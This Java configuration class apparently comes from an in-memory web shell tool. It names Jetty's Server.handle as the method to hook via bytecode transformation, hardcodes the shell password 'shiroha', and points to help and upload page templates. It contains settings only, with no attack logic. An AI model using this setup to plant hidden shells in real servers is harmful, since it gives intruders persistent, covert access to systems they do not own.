package com.stdout.Config;


public class ShellConfig {

    public static class SpringMemShellConfig {
        public static final String TransformedClassName = "org.eclipse.jetty.server.Server";
        public static final String TransformedMethodName = "handle";
        public static String MemShellPassword = "shiroha";
    }

    public static class SpringMemTransformerConfig {
        public static final String TransformedClassName = SpringMemShellConfig.TransformedClassName;
        public static final String TransformedEqualName = SpringMemShellConfig.TransformedClassName.replace(".", "/");
        public static final String TransformedMethodName = SpringMemShellConfig.TransformedMethodName;
    }

    public static class TemplatesConfig {
        public static final String Help = "templates/help.html";
        public static final String Upload = "templates/upload.html";
        public static final String StartTransformer = "start.txt";
        public static final String EndTransformer = "ends.txt";
    }



}
